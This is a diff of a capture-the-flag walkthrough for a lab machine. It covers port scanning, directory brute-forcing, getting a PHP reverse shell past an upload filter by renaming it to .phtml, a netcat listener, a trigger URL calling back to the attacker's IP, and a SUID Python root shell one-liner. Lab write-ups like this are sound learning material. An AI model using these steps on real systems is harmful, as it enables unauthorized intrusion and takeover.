@@ -15,22 +15,25 @@
 The first thing I did was run an Nmap scan. I wanted to know what ports were open and what services were running before doing anything else.
 
 ```bash
-nmap -sV -sC 10.49.179.155
+nmap -sV -sS -T4 -F 10.49.179.155
 ```
 
-![Nmap Scan Result](assets/images/01-nmap-scan.png)
+<p align="center">
+  <img src="assets/images/01-nmap-scan.png" width="750">
+</p>
 
 The scan came back with two open ports: **22 (SSH)** and **80 (HTTP)**. I noted the SSH port but didn't have any credentials to work with, so I opened the browser and went to check what was running on port 80 first.
 
 The webpage didn't show anything particularly interesting at first glance. I figured there might be more pages or directories that aren't linked anywhere on the surface, so I ran Gobuster to brute-force the directories.
 
 ```bash
-gobuster dir -u http://10.49.179.155 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u 10.49.179.155 -w /usr/share/wordlists/dirb/common.txt
 ```
+<p align="center">
+  <img src="assets/images/02-gobuster-result.png" width="750"> 
+</p>
 
-![Gobuster Result](assets/images/02-gobuster-result.png)
-
-Two directories showed up: **/panel** and **/uploads**. I went to `/panel` first to see what it was.
+Two directories showed up: `/panel` and `/uploads`. I went to `/panel` first to see what it was.
 
 <br>
 
@@ -38,13 +41,23 @@ Two directories showed up: **/panel** and **/uploads**. I went to `/panel` first
 
 `/panel` turned out to be a file upload page. No login, no nothing, just an upload form sitting there. My first thought was to try uploading a PHP reverse shell and see what happens.
 
-![Upload Panel](assets/images/03-upload-panel.png)
+<p align="center">
+  <img src="assets/images/03-upload-panel.png" width="500">
+</p>
 
-I grabbed the PHP reverse shell from `/usr/share/webshells/php/php-reverse-shell.php` and edited the IP and port inside the file to point to my machine, then tried uploading it directly. It got rejected. Okay, so there's some kind of filter on the file extension.
+I grabbed the PHP reverse shell from `/usr/share/webshells/php/php-reverse-shell.php` and edited the IP and port inside the file to point to my machine.
+
+<p align="center">
+  <img src="assets/images/04-shell-file.png" width="500">
+</p>
+
+Then tried uploading it directly. It got rejected. Okay, so there's some kind of filter on the file extension.
+
+<p align="center">
+  <img src="assets/images/10-upload-rejected.png" width="450">
+</p>
 
 I started searching for other file extensions that PHP can execute, basically looking for anything that might work as a bypass. I came across `.phtml` as one of the alternatives, and since the filter seemed to only care about `.php`, it was worth trying. I renamed the file to `reverse-shell.phtml` and uploaded it again.
-
-![Shell File](assets/images/04-shell-file.png)
 
 Before triggering the shell, I set up a Netcat listener on port 4444 to catch the connection.
 
@@ -52,11 +65,15 @@ Before triggering the shell, I set up a Netcat listener on port 4444 to catch th
 nc -lvnp 4444
 ```
 
-![Netcat Listener](assets/images/06-netcat-listener.png)
+<p align="center">
+  <img src="assets/images/06-netcat-listener.png" width="450">
+</p>
 
 This time the upload went through without any issues.
 
-![Upload Success](assets/images/05-upload-success.png)
+<p align="center">
+  <img src="assets/images/05-upload-success.png" width="450">
+</p>
 
 Since I knew the `/uploads` directory was accessible, I navigated to the uploaded file and passed the IP and port as parameters to trigger the reverse shell.
 
@@ -64,16 +81,17 @@ Since I knew the `/uploads` directory was accessible, I navigated to the uploade
 http://10.49.179.155/uploads/reverse-shell.phtml?ip=192.168.181.147&port=4444
 ```
 
+<p align="center">
+  <img src="assets/images/11-Trigger-The-Reverse-Shell.png" width="400">
+</p>
+
 The page loaded and hung. I switched back to my terminal and the connection had come in.
 
-![Reverse Shell Success](assets/images/07-reverse-shell.png)
+<p align="center">
+  <img src="assets/images/07-reverse-shell.png" width="700">
+</p>
 
-```
-whoami
-www-data
-```
-
-I was in as `www-data`. Not root yet, but it was a start. The first thing I did was hunt for the user flag. I used `find` to locate it since I didn't know where it was sitting on the filesystem.
+After gaining access, I found that I was operating as the `www-data` user. The next step was to search for the user flag. I used `find` to locate it since I didn’t know its exact location on the filesystem.
 
 ```bash
 find / -name user.txt 2>/dev/null
@@ -85,7 +103,9 @@ It came back at `/var/www/user.txt`. I read the file and got the first flag.
 cat /var/www/user.txt
 ```
 
-![User Flag](assets/images/user-flag.png)
+<p align="center">
+  <img src="assets/images/user-flag.png" width="450">
+</p>
 
 <br>
 
@@ -97,7 +117,9 @@ With a foothold on the machine, I started looking for ways to escalate. One of t
 find / -user root -perm /4000 2>/dev/null
 ```
 
-![SUID Search Result](assets/images/08-suid-search.png)
+<p align="center">
+  <img src="assets/images/08-suid-search.png" width="450">
+</p>
 
 Going through the results, I noticed `/usr/bin/python` in the list. Python with SUID is a known privesc vector, so I looked it up on GTFOBins to get the exact command.
 
@@ -105,7 +127,9 @@ Going through the results, I noticed `/usr/bin/python` in the list. Python with 
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
-![Whoami Root](assets/images/9-whoami-root.png)
+<p align="center">
+  <img src="assets/images/9-whoami-root.png" width="450">
+</p>
 
 That was it. I was root. The last thing left was grabbing the root flag.
 
@@ -113,7 +137,9 @@ That was it. I was root. The last thing left was grabbing the root flag.
 cat /root/root.txt
 ```
 
-![Root Flag](assets/images/root-flag.png)
+<p align="center">
+  <img src="assets/images/root-flag.png" width="450">
+</p>
 
 <br>
 
